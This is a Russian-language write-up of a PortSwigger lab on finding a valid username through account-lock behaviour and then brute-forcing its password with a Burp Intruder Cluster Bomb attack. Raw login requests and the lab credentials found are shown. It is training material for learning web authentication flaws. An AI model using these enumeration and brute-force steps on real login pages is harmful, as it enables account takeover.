---
title: "Username enumeration via account lock"
date: 2025-09-04
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-account-lock"
classes: wide
---

Для прохождения данной лабы нужно найти валидный логин и получить к нему доступ через ошибку в логике **аутентификации**. 

```
https://0aaa0014037a2cf181130738001100f3.web-security-academy.net
```

## Solution

Для начала нужно узнать валидные имена пользователей. Для этого соберу `HTTP`-запрос:

```http
POST /login HTTP/2
Host: 0aaa0014037a2cf181130738001100f3.web-security-academy.net
Cookie: session=9rmSqWjyOF7o05lo7Oxwg4DV4fAjDjnF
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaa0014037a2cf181130738001100f3.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0aaa0014037a2cf181130738001100f3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=login&password=password
```

Теперь попробую перебрать список логинов и посмотрю, что будет. Так получилось, что у аккаунта `athene` пароль был `password`. Ну и я его угадал. Так не должно было случиться. Но лаба пройдена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/1.png){: height="200" .align-center}

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/2.png){: height="200" .align-center}

Попробую решить ее иначе. Ибо это была чистая удача. Получу новый запрос:

```http
POST /login HTTP/2
Host: 0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net
Cookie: session=m95DGM8JYygamHSSkoNtJcF0V8uM1VGs
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=account&password=aaaaaaaaa
```

Переберу список логинов. Никаких отличий в ответах нет. Попробую отправить запрос к каждом аккаунту несколько раз. Для этого в `Burp Intrueder` выберу атаку `Cluster Bomb`. Отмечу места для пейлоадов на месте логина и в конце пароля:

```http
POST /login HTTP/2
Host: 0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net
Cookie: session=m95DGM8JYygamHSSkoNtJcF0V8uM1VGs
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://0aef009b03696d7c819b5c3b00cd0002.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=§account§&password=aaaaaaaaa§§
```

Для `account` буду использовать список логинов. Для второго пейлода сгенерирую 10 пустых шаблонов, выставив `Null payloads`. Таким образом для каждого аккаунта будет совершено 10 попыток входа. Отсортировав по размеру ответа я получил следующий результат:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/3.png){: height="200" .align-center}

Посмотрю сам ответ:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/4.png){: height="200" .align-center}

Такс. Нужный логин я нашел. Теперь нужно подобрать пароль. Переберу пароли из списка с сайта:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/5.png){: height="200" .align-center}

После сортировки получился интересный результат. У нескольких ответов была ошбика неверных данных, у большинства - ошибка множественных не успешных попыток, и только у одно нет ошибки. Ну что это, если не знак?)

Попробую следующие креды `ftp`:`maggien`.

Я в системе!)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_account_lock/6.png){: height="200" .align-center}